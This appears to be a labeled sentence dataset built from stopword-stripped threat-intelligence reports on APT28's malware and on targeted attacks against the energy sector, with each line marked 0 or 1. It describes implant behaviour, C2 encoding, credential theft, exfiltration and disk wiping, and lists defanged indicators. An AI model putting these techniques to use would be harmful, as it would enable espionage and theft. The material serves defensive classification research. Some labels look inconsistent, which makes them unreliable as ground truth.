In late 2013 APT28 used lure contained letter addressing journalist first name claiming originate '' Chief Coordinator '' Reason Magazine's '' Caucasian Issues Department '' - division appear exist	1
( Reason Magazine US-based magazine ) The letter welcomed individual contributor requested topic ideas identification information order establish magazine	0
In background decoy document installed SOURFACE backdoor victim 's system	1
The body letter suggests APT28 actors able read least two languages – Russian English	0
The grammar letter also indicates English author 's first language despite purportedly originating US-based magazine	0
This implies Russian may APT28 author 's preferred language	0
Targeting journalists could provide APT28 sponsors way monitor public opinion identify dissidents spread disinformation facilitate targeting	0
Several nation states suspected targeting journalists dissidents monitor activity including China Iran. Journalists Caucasus working Caucasus independence issues would prime target intelligence collection Moscow	0
Journalists critical Kremlin long targets surveillance harassment number governments human rights organizations publicly criticized government treatment journalists increasing consolidation control media	0
We seen APT28 register least two domains mimicking domains legitimate organizations Caucasus shown table	1
One APT28 domain imitated key Chechen-focused news website appeared target members Armenian military hosting fake login page	1
Of particular note Kavkaz Center Chechen-run website designed present alternative view long-running conflict Russia Chechen separatists	0
In 2004 2013 Russia 's Foreign Minister voiced displeasure Swedish company continues host Kavkaz Center website	0
Eastern European countries ' political military postures traditionally core Russian government interests	0
The Kremlin long regarded former Soviet Republics satellite states sphere economic political military interest	0
Over past two decades many states joined NATO EU Russia attempted regain influence region	0
Many APT28 's targets parallel continued focus Eastern European governments militaries	0
We evidence APT28 made least two attempts compromise Eastern European government organizations • In late 2013 incident FireEye device deployed Eastern European Ministry Foreign Affairs detected APT28 malware client 's network	0
• More recently August 2014 APT28 used lure ( Figure 3 ) hostilities surrounding Malaysia Airlines flight downed Ukraine probable attempt compromise Polish government	1
A SOURFACE sample employed Malaysia Airlines lure referenced Polish computer security company blog post	1
The Polish security company indicated sample '' sent government '' presumably Polish government given company 's location visibility	0
We evidence APT28 made least two attempts compromise Eastern European government organizations	0
APT28 registered domains similar legitimate Eastern European news sites governments listed Table 2	1
These domain registrations suggest APT28 interested Eastern European political affairs also group targets Eastern European governments directly	0
In addition APT28 used one domain command control sessions ( baltichost [ ] org ) themed Baltic Host exercises	1
Baltic Host multinational logistics planning exercise hosted annually since 2009 one three Baltic States ( Estonia Latvia Lithuania three Russia 's border ) rotational basis	0
In June 2014 event integrated larger U.S. Army training event focused exercises improve interoperability regional allies partners. This domain registration suggests APT28 sought target individuals either participating exercises interested Baltic military security matters	0
Such targets would potentially provide APT28 sensitive tactical strategic intelligence concerning regional military capabilities relationships	0
These exercises particular point interest Moscow pro- Kremlin press cited Russia 's interpretation military exercises NATO 's involvement '' sign aggression '' Russia 's Foreign Minister publicly stated exercise '' demonstration hostile intention	0
'' APT28 's lures domain registrations also demonstrate interest NATO European security organizations	0
NATO remains chief Russian adversary words Russia 's 2010 military doctrine '' main external military danger '' particularly moves '' closer borders Russian Federation	0
'' As traditional western counterweight Soviet Union Russia regards NATO particularly NATO 's eastward expansion threat Russia 's strategic stability	0
APT28 also registered domain name imitating Organization Security Cooperation Europe ( OSCE ) intergovernmental organization cited widespread fraud numerous Russian state elections	0
Insider information NATO OSCE security organizations would inform Russian political military policy	0
Several domains APT28 registered imitated NATO domain names including NATO Special Operations Headquarters NATO Future Forces Exhibition	1
We also observed user suspect works NATO HQ submit APT28 sample VirusTotal probably result receiving suspicious email	0
APT28 also demonstrated interest defense attaches working European countries	0
We identified APT28 lure containing decoy document list British officers U.S. Canadian military attachés London	1
Finally APT28 used lure contained apparent non-public listing contact information defense attachés '' Ankara Military Attaché Corps ( AMAC ) '' appears professional organization defense attachés Turkey	1
In addition targeting European security organizations governments appears APT28 targeting attendees European defense exhibitions	0
Some APT28- registered domains imitated defense events held Europe Farnborough Airshow 2014 EuroNaval 2014 EUROSATORY 2014 Counter Terror Expo	1
In September 2014 APT28 registered domain ( smigroup- online.co [ ] uk ) appeared mimic SMi Group company plans events '' Defence Security Energy Utilities Finance Pharmaceutical sectors	1
'' Among events SMi Group currently planning military satellite communications event November 2014	0
Targeting organizations professionals involved defense events would likely provide APT28 opportunity procure intelligence pertaining new defense technologies well victim organizations' operations communications future plans	0
APT28 targeted variety organizations fall outside three themes highlighted	0
However profiling APT28 's targets detail particularly indicative specific sponsor 's interests	0
They indicate parallel areas interest many governments run counter Russian state interests	0
Other probable APT28 targets identified Our analysis group 's commonly used tools indicates APT28 systematically updating malware since 2007	0
APT28 's tools suggestive group 's skills ambitions identity	0
Our analysis group 's commonly used tools indicates APT28 systematically updating tools since 2007	0
APT28 likely supported group developers creating tools intended long-term use versatility make effort obfuscate activity	0
This suggests APT28 receives direct ongoing financial resources well-established organization likely nation state government	0
APT28 's malware settings suggest developers done majority work Russian language build environment Russian business hours suggests Russian government APT28 's sponsor	0
Some APT28 's commonly used tools SOURFACE downloader second stage backdoor EVILTOSS modular family implants call CHOPSTICK	1
• SOURFACE This downloader typically called Sofacy within cyber security community	0
However observed name '' Sofacy '' used refer APT28 malware generally ( include SOURFACE dropper EVILTOSS CHOPSTICK credential harvester OLDBAIT ) using name SOURFACE precisely refer specific downloader	1
This downloader obtains second-stage backdoor C2 server	1
CORESHELL updated version SOURFACE	0
• EVILTOSS This backdoor delivered SOURFACE downloader gain system access reconnaissance monitoring credential theft shellcode execution	1
• CHOPSTICK This modular implant compiled software framework provides tailored functionality flexibility	0
A number malware variants profile especially CHOPSTICK family demonstrate formal coding practices indicative methodical diligent programmers	0
The modularity CHOPSTICK alone flexible lasting platform demonstrates planning long-term use versatility	0
We also noted APT28 tailors implants target environments configuring use local network resources email servers	1
APT28 attempted obfuscate code implement counter-analysis techniques • One latest samples CORESHELL includes counter-reverse engineering tactics via unused machine instructions	1
This would hinder static analysis CORESHELL behavior creating large amount unnecessary noise disassembly	1
• A number CORESHELL droppers also conduct runtime checks attempting determine executing analysis environment trigger payloads	1
• Many samples across SOURFACE/ CORESHELL CHOPSTICK EVILTOSS malware families obfuscate strings decoded runtime	1
Two malware families ( SOURFACE/CORESHELL EVILTOSS ) use decryption sequence similar algorithms string encoding decoding	1
These families encode strings compile time using custom stream cipher	1
From high level ciphers share similar design across malware families differ slightly internal arithmetic operations	0
• APT28 employed RSA encryption protect files stolen information moved victim 's network controller	1
APT28 made incremental systematic changes SOURFACE downloader surrounding ecosystem since early 2007	0
These changes indicate long-standing dedicated development effort behind APT28	0
We observed samples SOURFACE downloader compiled 2007 2014	0
We call SOURFACE ( samples frequently named netids.dll ) first stage downloader primary job retrieve second stage payload C2 server	1
Until 2013 SOURFACE downloader used hard-coded IP addresses C2 communications whereas future CORESHELL samples use domains	1
First malware family collection malware sample shares significant amount code others	0
There exceptions example files contain public standard code libraries take consideration making family determination	0
A malware ecosystem group malware families work together perform objective	0
Perhaps simplest typical ecosystem dropper backdoor used together	0
They may share code structure related one drops installs	1
The ecosystem surrounding SOURFACE downloader frequently consists dropper installs SOURFACE	1
The SOURFACE downloader receives another dropper C2 server second dropper installs second stage backdoor usually EVILTOSS	1
In April 2013 based compile time group began make significant alterations SOURFACE downloader	0
They started changing compiled DLL name '' coreshell.dll '' making minor changes network communications seen Figure 7	0
The hostname volume serial number OS version data encoded new URL format	0
As seen table SOURFACE/ CORESHELL developers also made modifications changed exported function name file size time	0
In April 2013 based compile time group began make significant alterations SOURFACE downloader	0
Variants SOURFACE second stage backdoor EVILTOSS share code similarities SOURFACE	0
However contains capabilities including ability provide access file system registry enumerate network resources create processes log keystrokes access stored credentials execute shellcode	1
The backdoor encrypts data uploads RSA public key	1
Many variants seen named netui.dll	0
EVILTOSS variants may use Simple Mail Transfer Protocol ( SMTP ) send stolen data attachment named '' detaluri dat ''	1
The backdoor attaches file preformatted email sends victim 's mail server	1
Interestingly found antivirus report 2004 detailing appears early variant EVILTOSS	0
The backdoor installed alongside NATO-themed decoy document depicted Figure 8	1
The backdoor sent data via SMTP natosmtp @ mail [ ] ru received tasking via POP natopop @ mail [ ] ru	1
Although conclusively attributed sample APT28 suggest possibility APT28 operating since early 2004	0
A modular development framework suggests group organized development effort since early 2007	0
During research discovered APT28 uses backdoor developed using modular framework	1
We call backdoor CHOPSTICK somewhat ironic name comes semi-random name generator	0
The modular design allows flexible options compiling variants different capabilities needed well deploying additional capabilities runtime	0
This allows developers make targeted implants including capabilities protocols necessary specific environment	0
Such modular framework suggests group organized development effort since early 2007	0
A formal development environment code versioned well-organized would almost certainly required track define various modules included backdoor compile time	0
CHOPSTICK variants may move messages information using least three methods 1	0
Communications C2 server using HTTP	1
These protocols covered detail Appendix D. 2	0
Email sent specified mail server	1
One CHOPSTICK v1 variant contained modules functions collecting keystroke logs Microsoft Office documents PGP files	1
The monitoring new files interest performed '' Directory Observer '' module	1
In one sample information intended sent via SMTP using Georgian MIA mail server	1
It used one four embedded sender email addresses ( @ mia.gov.ge ) send files via email another email address mail server	1
All information required email hardcoded backdoor	0
3	0
Local copying defeat closed networks	0
One variant CHOPSTICK focuses apparent air gap / closed network capabilities routing messages local directories registry USB drives	1
During research APT28 's malware noted two details consistent across malware samples	0
The first APT28 consistently compiled Russian language settings malware	0
The second malware compile times 2007 2014 corresponded normal business hours UTC + 4 time zone includes major Russian cities Moscow St. Petersburg	0
PE resources include language information helpful developer wants show user interface items specific language	0
Non-default language settings packaged PE resources dependent developer 's build environment	0
Each PE resource includes '' locale '' identifier language ID '' composed primary language identifier indicating language sublanguage identifier indicating country/region	0
'' At time writing paper identified 103 malware samples attributed APT28 contained PE resources	0
Table 5 shows locale identifiers associated language country/region samples	0
The samples Russian language settings compiled late 2007 late 2013 depicted Figure 9	0
This consistency long timeframe suggests developers APT28 malware using build environment Russian language settings least time made effort obscure detail	0
Overall locale IDs suggest APT28 developers operate Russian English	0
Of 140 malware samples attributed APT28 far 89 % compiled 0400 1400 UTC time depicted Figure 10	0
Over 96 % compiled Monday Friday	0
This parallels working hours UTC+0400 ( compile times begin 8AM end 6PM time zone )	0
This time zone includes major Russian cities Moscow St. Petersburg	0
We started researching APT28 based activity observed clients ' networks similar targeted threat groups identified time	0
We assess APT28 likely sponsored Russian government	0
We summarize key observations APT28 Figure 11	0
APT28 's characteristics-their targeting malware language working hours-have led us conclude tracking focused long- standing espionage effort	0
Given available data assess APT28 's work sponsored Russian government	0
We use term '' threat group '' refer actors work together target penetrate networks interest	0
These individuals may share set tasks coordinate targets share tools methodology	0
They work together gain access targets steal data	1
The art attributing disparate intrusion activities threat group always simple	0
Different groups may use similar intrusion methodologies common tools particularly widely available Internet pwdump HTran Gh0st RAT	0
There may overlaps groups caused sharing malware exploits authored even sharing personnel	0
Individual threat actors may move groups either temporarily permanently	0
A threat actor may also private citizen hired multiple groups	0
Multiple groups occasion compromise target within timeframe	0
Distinguishing one threat group another possible enough information analytical experience tools piece together	0
We analyze multiple incidents tell evidence left behind given incident result one threat group another	0
Threat actors leave behind various forensic details	0
They may send spear phishing emails specific IP address email address	1
Their emails may contain certain patterns ; files specific names MD5 hashes timestamps custom functions encryption algorithms	0
Their backdoors may command control IP addresses domain names embedded	0
These examples myriad forensic details consider distinguishing one threat group another	0
At basic level say two intrusion events attributed group collected enough indicators show beyond reasonable doubt actor group actors involved	0
We track indicators significant linkages associated identified threat groups proprietary database comprises millions nodes linkages	0
In way always go back answer '' '' associated cyber threat activity particular group	0
SOURFACE downloader obtains second stage backdoor C2 server	1
Over time downloader evolved newer versions usually compiled DLL name 'coreshell.dll ' distinct enough older versions refer SOURFACE/CORESHELL simply CORESHELL	0
This appendix focuses newer versions	0
CORESHELL uses two threads communicate C2 server	1
The first thread sends beacons contain process listing compromised host	1
The second thread responsible downloading executing stage two payloads	1
Messages sent using HTTP POST requests whose bodies contain encrypted Base64 encoded data	1
The encryption algorithm custom stream cipher using six-byte key	0
Commands controller CORESHELL implant encrypted using another stream cipher time using eight-byte key	1
CORESHELL used user agent string ( '' MSIE 8.0 '' ) SOURFACE previously used recent samples CORESHELL uses default Internet Explorer user agent string obtained system	0
Figure 11 shows example POST request	0
When Base64 decoded POST content looks like The key used encrypt message six bytes long appended end message	0
In example key would 30 ac e5 21 e4 a6	0
When message decrypted resulting plaintext The following table contains breakdown field 's C2 message	0
Commands sent C2 server CORESHELL backdoor HTTP responses POST requests	1
The command identified NULL terminated UNICODE string '' OK '' ( O\x00\K\x00\x00\ x00 )	0
The command Base64 encoded immediately follows '' OK '' string	0
Figure 12 shows sample CORESHELL command The Base64 decoded string The following table contains description field command message When command '' 10 41 70 41 10 42 33… '' decrypted using key '' 01 01 01 01 01 01 01 01 '' following command message produced The implant supports following four command identifiers controller seen Table 8	0
The first byte command message specifies command type immediately followed PE shellcode executed	0
In example command byte 04 indicating following bytes shellcode	0
If command byte 01 02 03 following bytes would DLL EXE would written disk executed	1
CHOPSTICK backdoor uses modularized object-oriented framework written C++	1
This framework allows diverse set capabilities across malware variants sharing common code base	0
CHOPSTICK may communicate external servers using SMTP HTTP	1
This appendix documents variants using HTTP communications	0
The first time CHOPSTICK executed may encrypt store configuration data Registry key HKU\S-1-5-19Classes\Software\Microsoft\MediaPlayer\ { E6696105-E63E-4EF1-939E- 15DDD83B669A } \chnnl	1
The user HKU\S-1-5-19 corresponds LOCALSERVICE account SID	0
The configuration block encrypted using RC4 encryption	1
The key combination 50-byte static key four-byte salt value randomly generated runtime	0
The static key derived opcodes backdoor	0
CHOPSTICK collects detailed information host including Windows version CPU architecture Windows Firewall state User Account Control ( UAC ) configuration settings Windows Vista Internet Explorer settings	1
It also tests installation specific security products ( Table 9 ) applications ( Table 10 )	1
After collecting host information CHOPSTICK creates hidden file may named % ALLUSERSPROFILE % \edg6EF885E2.tmp temporary storage creates Windows mailslot name '' checkmesv5555 ''	1
Its usage Windows mailslot would potentially allow external binaries write data '' checkmesv5555 '' mailslot possibly allowing CHOPSTICK encrypt store output malware	1
It creates thread records user activity host capturing desktop screenshots JPEG format tracks current window focus collects keystrokes scrapes window contents ( text context menus etc. )	1
User activity captured every 500 milliseconds logged HTML-like format	1
The thread writes user activity log messages '' checkmesv5555 '' mailslot plain text	1
CHOPSTICK reads messages mailslot encrypts using RC4 stores encrypted message edg6EF885E2.tmp temporary file	1
The RC4 encryption used also uses 50- byte static key plus four-byte random salt value	0
After approximately 60 seconds execution time CHOPSTICK begins communicating one C2 servers HTTP	1
After sending initial HTTP GET request uploads file contents edg6EF885E2 tmp C2 server using HTTP POST requests	1
It wait response server begin uploading	0
Once contents edg6EF885E2.tmp uploaded CHOPSTICK deletes file	1
Figure 13 contains example HTTP POST request uploading segment edg6EF885E2.tmp	1
'' respectively	1
Each HTTP request contains multiple Base64 encoded URL parameters however one parameter contains information encoded malware ( '' ai= '' ) rest URL parameters appear randomly generated per request	0
CHOPSTICK encrypts 11-byte sequence '' ai= '' parameter	1
The purpose parameter appears uniquely identify particular instance backdoor C2 server	1
The Base64 encoded text parameter begins number randomly generated alphabetical characters presumably intended prevent people Base64 decoding whole string without knowledge malware family works	0
The first four bytes message XOR key remainder data	0
Once decrypted using XOR key 11-byte sequence revealed	0
The first seven bytes static hard-coded CHOPSTICK last four bytes appear unique	0
The message body POST request also Base64 encoded	1
This encoded string also prefixed random characters designed break output Base64 decode operation entire string	0
The first 15 bytes decoded message body comprise another 11-byte sequence similar sequence stored '' ai= '' parameter described	0
Decrypting bytes yields another static seven-byte sequence followed four unique bytes	0
The remainder message body consists RC4 encrypted data containing HTML-formatted user activity log edg6EF885E2.tmp	0
After uploading edg6EF885E2.tmp CHOPSTICK continues query C2 servers commands using HTTP GET requests	1
The malware contains code allows load memory-map external modules export following functions SendRawPacket GetRawPacket InitializeExp DestroyExp IsActiveChannel GetChannelInfo SetChannelInfo Run GetModuleInfo GiveMessage TakeMessage	1
CHOPSTICK backdoors compiled within modularized development framework	0
This means two separate CHOPSTICK backdoors may contain vastly different functionality depending modules included compile time	0
The modules included instance CHOPSTICK may reported C2 server part POST messages	1
Figure 14 includes example CHOPSTICK v1 variant To decode POST content first step remove characters Base64 string ( number characters remove may vary different communication channels )	0
In example Figure 14 number characters removed seven	0
Once characters removed decoded ( still encrypted ) text looks like The first two words ( '' 72 11 '' '' fd 22 '' ) checksums used validate message	1
The next 4 bytes '' f8 dc 33 9e '' salt value appended end RC4 key	0
Once decrypted message looks like following The strings '' V4MGNxZWlvcmhjOG9yZQ '' '' = \xee '' hardcoded implant	0
The module information starts offset 0x20 string '' 01 00 00 '' formatted follows The modules included CHOPSTICK v1 implant Our determination CHOPSTICK '' v1 '' versus '' v2 '' based self-identification kernel ID associated modules	0
Compare list CHOPSTICK v1 modules Table 12 list modules example CHOPSTICK v2 variant Table 13 The kernel IDs 0x0001 0x0002 indicate different versions	0
The corresponding modules backdoor also consistently identified 0x01 0x02 respectively second byte	0
In variants modules keystroke log file system access command shell capabilities consistent identifiers 0x10 0x11 0x13 respectively first byte	0
This suggests first byte module ID identifies module type whereas second byte identifies kernel version	0
The kernel sends commands module using module ID	0
The commands module understands likely consistent build build	0
Table 14 Table 15 show examples commands module understands	0
OLDBAIT credential harvester installs % ALLUSERPROFILE % \\Application Data\ Microsoft\MediaPlayer\updatewindws.exe	1
There missing space MediaPlayer directory filename missing 'o ' character	0
Both internal strings logic obfuscated unpacked startup	1
Credentials following applications collected Both email HTTP used send collected credentials	1
Sample HTTP traffic displayed Figure 15	0
OLDBAIT handles APIs similarly SOURFACE EVILTOSS	0
There setup routine loads imports table API calls reference index table	0
In SOURFACE EVILTOSS table stored global variable OLDBAIT table allocated runtime pointer passed functions	0
The energy sector become major focus targeted attacks among top five targeted sectors worldwide	0
Companies sector facing growing risk services interrupted losing data	0
The threat energy firms likely increase coming years new developments extensions smart grids smart metering expose infrastructure Internet	0
Equipment connected Internet networks immune threats already number successful attacks isolated systems	0
Operators critical infrastructure well energy utility companies need aware threats prepare accordingly	0
The threat energy firms comes several different sources	0
In cases espionage competitors primary motive data new projects exploration finances targeted	0
Disruption destruction goals attacks	0
Some instances appear state sponsored disruption Iranian nuclear program Stuxnet worm 2010 one attacks began trend	0
Others appear work hacktivists political environmental agendas	0
Internal attackers like disgruntled employees also major source attacks often lead service disruption	0
The majority actors behind attacks grown sophisticated way attack	0
During monitoring period July 2012 June 2013 observed average 74 targeted attacks per day globally	0
Of nine attacks per day targeted energy sector	0
Accounting 16.3 percent attacks energy sector second targeted vertical last six months 2012 government/public sector exceeding 25.4 percent attacks	0
The high ranking mainly due major attack global oil company observed September 2012	0
However first half 2013 energy sector continued attract high proportion attacks ranking fifth place 7.6 percent targeted attacks	0
Not attacks analyzed used highly sophisticated tools	0
Most could prevented following best practice guidelines protecting IT infrastructure industrial components indicating despite high revenues strategic importance many energy sector companies prioritizing cybersecurity	0
The number targeted cyberattacks general risen past years	0
In addition rate attack exposure also risen companies becoming aware attacks expecting searching indications compromise	0
It new phenomenon importance grown	0
The Council Foreign Relations US think tank reported energy companies including oil gas producers often focus targeted attacks summer 2012	0
In May 2013 US Department Homeland Security ( DHS ) warned increase sabotage attacks US energy companies located Middle East	0
The government tracked multiple attacks issued warning together Industrial Control Systems Cyber Emergency Response Team ( ICS-CERT )	0
A report US Congress supported picture stating many power utilities companies constant daily attack cyberspace	0
Taking account successful breaches critical infrastructures still rare numbers included generic malware infections nevertheless highlights potential cyberattacks energy sector	0
As sectors attackers often valuable information	0
For example seen attackers target intellectual property technology photovoltaic research wind turbines data gas field exploration	0
Information high value generate huge profits attackers sponsors	0
The information also misused act sabotage	0
Many power utilities companies fear disruptive attacks regardless whether done internal external attackers	0
The energy sector high potential critical disruption sabotage attacks	0
Any interruption power grid would cause substantial chaos cascading effects resulting financial loss	0
In past quite attacks included targets energy sector	0
Some focused like Stuxnet Duqu Shamoon/Disttrack Night Dragon	0
Others saw power companies targeted among many sectors Hidden Lynx Nitro Flamer Net Traveler Elderwood name	0
One biggest examples game changer many organizations Stuxnet	0
This targeted sabotage attack believed aimed uranium enrichment facilities Iran made clear could done cyberattacks	0
It also clear energy sector exempt generic attacks every company faces ransomware locks PCs financial Trojans attempt steal passwords credit card details	1
For example case happened May 2013 small fuel distribution company North Carolina fell victim cyberheist transferred US $ 800,000 company 's bank account	0
Such threats spread broadly might impact person regardless employer	0
These attackers aim infecting many computers possible order maximize chances profits	0
These attacks include nonspecific data breaches employee customer records get stolen happened US Department Energy July 2013	1
For paper focused email data targeted attacks July 2012 June 2013	0
Even though watering holes becoming frequently used targeted attacks unfortunately quite difficult reliably map individual campaigns	0
A blocked drive-by download attempt give indication targeted attack general noise	0
In quite cases see common malware like Poison Ivy used generic attackers targeted attacks	0
In cases sole difference sophisticated targeted attack generic one lies person commanding malware	0
Historically industrial control systems ( ICS ) supervisory control data acquisition ( SCADA ) systems separated networks connected Internet network	0
Unfortunately security segregation approach fully protect cyberattacks	0
In reality networks rarely completely isolated	0
Often configuration updates periodically installed log files transferred	0
If systems directly connected method choice types interactions usually USB stick non-permanent modem connection provides way restricted networks	0
This allows malware spread isolated networks demonstrated many times threats Stuxnet	1
If networks truly segregated would mean would software updates installed leaving old vulnerabilities open	0
There also issues around processes	0
For example revocation lists digital certificates seldom updated therefore certificates longer valid checked properly would still accepted	0
With increasing desire connectivity reaching industrial plants many operators started connect ICS Internet	0
New adapters bridge older technology never intended controlled Internet allowing connected easily	0
This allows efficient centralized monitoring extent remote control equipment	0
Depending type machinery controlled human-machine interface ( HMI ) ICS modifications possible	0
Some systems physically connected pure read-only mode monitoring	0
And even fully connected turbines physical limitations emergency systems based physical effects overridden digital controller	0
Thus Hollywood scenarios open flood gates turbines fly air possible	0
However sabotage attacks damage equipment definitely possible already demonstrated	1
In future systems going implement failsafe switches software opening vector malware attacks	0
An additional source concern countries started open energy market smaller private contributors	0
This means almost anyone use mini power plants like water wind photovoltaic sites feed energy back power grid	0
Often operators full IT staff supporting facilities hand might lead vulnerable installations	0
Furthermore may deploy new technology might untested contain unknown vulnerabilities	0
While smaller sites make small portion grid new decentralized power input feeds challenge balance power grid well need carefully monitored	0
Small outages changes domino effect whole power grid	0
To increase exposure energy firms even sites like SHODAN essentially search engine devices enable anyone easily find exposed controllers Internet	0
Of course industrial control systems connected Internet critical systems even real ones	0
Some researchers started create honey pot systems order study attackers apparently already attracted attackers like Comment Crew/APT1 group broken decoy systems	0
Smart grids smart metering bringing significant change world 's power systems	0
Experts predict billions smart meters sensors installed worldwide next ten years	0
They enable utility companies measure energy consumption granular level creating better flow patterns enabling different prices consumption based time day location	0
This development brings new opportunities well new challenges	0
As connected infrastructure important secure network endpoint multiple levels	0
There already proof concept attacks demonstrate smart meters could manipulated send back false information report incorrect billing IDs leading power theft	1
In addition issue securing devices smart grids produce huge amount data depending regulations need kept audits	0
Some data may sensitive could raise privacy concerns properly protected	0
This could easily grow petabytes data needs safely stored managed	0
It beyond scope paper address challenges associated smart grids smart meters	0
Symantec created dedicated whitepaper topic How protect critical infrastructure mitigate fraud guarantee privacy	0
As member CRISALIS project Symantec following developments closely helping secure critical infrastructure together partners academia different industry sectors	0
There numerous cyberattacks energy sector past years	0
Not work sophisticated attackers ; incidents collateral damage caused malware infections bad configuration issues	0
These incidents highlight fact attacks happen real life consequences	0
In 2013 part Austrian German power grid nearly broke control command accidentally misdirected	0
It believed status request command packet broadcast German gas company test newly installed network branch found way systems Austrian energy power control monitoring network	0
Once message generated thousands reply messages generated even data packages turn flooded control network	0
To stop self-inflicted DDoS attack part monitoring control network isolated disconnected	0
Fortunately situation resolved without power outages	0
In 2008 Tom Donahue senior Central Intelligence Agency ( CIA ) official told meeting utility company representatives cyberattacks taken power equipment multiple cities outside United States	1
In cases attacker tried extort money energy companies threatening blackouts	0
In 2003 safety monitoring system Ohio nuclear power plant apparently went offline several hours due Slammer worm infection	1
Fortunately power plant already offline due maintenance installed secondary backup monitoring system unaffected worm	0
Nevertheless incident raised safety concerns	0
At beginning 2003 marine terminal Venezuela targeted sabotage attack	1
Details attack scarce vague seems strike attacking group managed get access SCADA network oil tanker loading machinery overwrote programmable logic controllers ( PLCs ) empty program module	1
This halted machinery preventing oil tankers loading eight hour till unaffected backup code reinstalled PLCs	1
The attack sophisticated easily spotted	0
A small modification PLC code instead would probably gone unnoticed long time	0
In 2001 attack took place California 's power distribution center controls flow electricity across California	0
Due apparently poor security configuration attacker able compromise two Web servers part developer network penetrate	0
Fortunately attackers stopped managed attack systems tied transmission grid Western United States	0
According Russian officials largest natural gas extraction company country successfully attacked 2000	0
The attackers used Trojan gain access control gas pipelines	1
Through switchboard flow individual gas pipelines could modified would easily caused widespread disruption	0
Aside incidents also number serious well-documented targeted attacks energy sector The Stuxnet incident relatives Duqu Flamer Gauss talked-about cases targeted attacks	0
As far know today Stuxnet operation began November 2005 registration command control ( C & C ) servers used attacks	1
The first recorded appearance call Stuxnet version 0.5 November 2007	0
Since handful different versions found analyzed	0
Stuxnet 1.x based known '' tilded '' platform ; whereas Stuxnet 0.5 based Flamer framework	0
The code segments programming style differ indicates two different programming teams likely responsible different branches Stuxnet	0
Thorough investigation mechanism functions threat started July 2010	0
Stuxnet first known autonomous threat target sabotage industrial control systems extent	1
Stuxnet sophisticated piece malware uses seven vulnerabilities spread infect targets	1
The notable vulnerability Microsoft Windows Shortcut 'LNK/PIF ' Files Automatic File Execution Vulnerability ( CVE-2010-2568 ) allows auto-execute USB drives	0
Spreading infected portable media drives allowed also infect networks isolated air gaps unreachable Internet	1
This likely first infection vector used Stuxnet	0
In addition able infect Step7 project files used control Programmable Logic Controllers ( PLCs )	1
This allowed worm infect computers whenever engineer exchanged project files	1
Besides also spread network shares printer spooler vulnerability old Windows RPC ( remote procedure calls ) vulnerability known password WinCC database	1
In end Stuxnet propagated authors probably intended	0
We monitored 40,000 infected IP addresses 155 countries	0
Many systems likely collateral damage intended infected attackers	0
For example multiple computers Chevron infected Stuxnet without damage done	0
Part malware code signed stolen digital certificates making harder detect security tools	1
To hide activity even Stuxnet executed slightly different infection routines depending security software installed target	1
On USB drive malware would hide files even delete three successful propagations	1
Tricks like make detection malware difficult frequently used modern targeted attacks	1
Stuxnet 's payload focused PLCs used control different industrial components	0
The target Stuxnet operation believed uranium enrichment facility Iran	0
The sabotage payload disrupted partially destroyed cascaded high frequency gas centrifuges	1
The early version Stuxnet targeted S7- 417 PLCs modified valve settings	1
Closing valves certain points time would lead increase pressure could damage equipment	0
The later version threat focused S7-315 PLCs manipulating spinning frequency rotating motors	1
By speeding centrifuges slowing repeatedly output quality could spoiled centrifuges could damaged	0
The payload would become active fingerprint found PLC setup matched given configuration setup	1
This minimized collateral damage facilities showed attackers in-depth knowledge targeted uranium enrichment facilities	0
To avoid detection personnel monitoring human machine interface ( HMI ) plant threat recorded measurement readings normal operation played back loop	1
Operation Night Dragon uncovered 2010 typical example global oil companies targeted time aim disruption mind	0
The attacks started late 2009 directed finding project details financial information oil gas field exploration bids	1
The attackers started compromising public facing Web servers SQL injection installing Web shells	1
Once control server used common hacking tools harvest local passwords dump password hashes sniff authentication messages exploit internal active directory configuration	1
This allowed move internal computers using gathered passwords	1
In addition spear phishing messages used compromise additional computers	1
The attackers use zero-day vulnerabilities attacks	0
Rather used publicly available tools individual job	0
On compromised computers common Backdoor.Trojan installed communicated back C & C server allowing remote access computer	1
This allowed attacker find extract valuable information	1
In August 2012 extremely destructive cyberattack hit estimated 30,000 computers one largest oil producers world Saudi Arabia	0
The W32.Disttrack malware used attack also known Shamoon consists three components dropper wiper reporter module	0
The dropper component responsible creating required files system registering service called '' TrkSvr '' order start Windows	1
It also attempts copy accessible network shares execute remotely successfully copied	1
The wiper component activated hardcoded configuration date passed	0
This enables coordinated '' time bomb '' scenario	0
The module drops legitimate digitally signed device driver provides low level disk access user space	1
The malware collects file names starts overwriting JPEG image 192KB blocks random data	1
At end Disttrack finishes computer wiping master boot record data	1
The reporter component responsible sending back HTTP GET request C & C server	1
It reports domain name IP address number files overwritten	1
By acquiring user credentials gaining access domain controller attackers able push malware many systems triggered destructive payload	1
Disttrack 's secondary goal may steal valuable information infected computers main intent render computers unusable wiping operating system master boot record causing disruption downtime targeted company	1
Although wiping also frequently used destroy evidence attack make forensics difficult	1
The malware contain payload ICS like Stuxnet PLCs sophisticated	0
According company computer related production distribution oil affected since operational network separated specially protected	0
One group claimed responsibility attack posted Pastebin anti-oppression hacker group	0
The attack prompted disappointment regimes Middle East group said	0
True shows necessarily state-sponsored attackers carrying disruptive attacks	0
Sabotage attacks usually fall orbit hacktivists seek attention rather profit	0
Some sources reported attackers help insiders would explain far unclear infection vector	0
Soon attack became known Qatari gas company attacked similar way	0
Spear phishing along watering hole attacks one common attack vectors used attack companies	1
The attacks simple carry	0
They often follow pattern starting reconnaissance phase gather publicly available information	0
This followed incursion phase breaking compromising computers	1
After comes discovery phase attacker gathers passwords maps internal network	1
The final stage capture exfiltration valuable information copied sent back attacker	1
The last phase may also involve disruption attack goal sabotage	0
For detailed analysis attack phases see Appendix C. A spear phishing attack consists email either malicious attachment link malicious website	0
Such emails sent bulk handful key users	0
These waves often repeated till enough people fall bait compromise computers	0
For analysis social engineering themes used attack details attachment types used see Appendix A	0
Some spear phishing campaigns smaller scale focused specific targets	0
For example January 1 2013 global energy research company targeted	0
A wave spear phishing emails sent two Freemailer accounts 291 individuals targeted company	1
All receiving email addresses started letter G R covering half alphabet	0
Whether second wave emails using half alphabet whether attackers got hands part address book remains unknown	0
All emails either subject line '' 2013 Obama QE4 Merry Christmas '' '' 2013 Obama QE4 ''	0
It common see spear phishing attacks take place around holidays people receiving emails times less likely perform due diligence opening	0
All emails contained Trojan.Dropper disguised attachment filename AVP.dll	1
The malware drops malicious Downloader '' clbcatq.dll '' newly created '' wuauclt '' directory posing Windows update taking advantage DLL search order hijack weakness order load malicious code Windows	1
The family dropper used previous targeted attacks sectors indicating group multiple interests behind attacks	0
The back door provided full access compromised computers	1
A week later January 7 2013 group attacked company	0
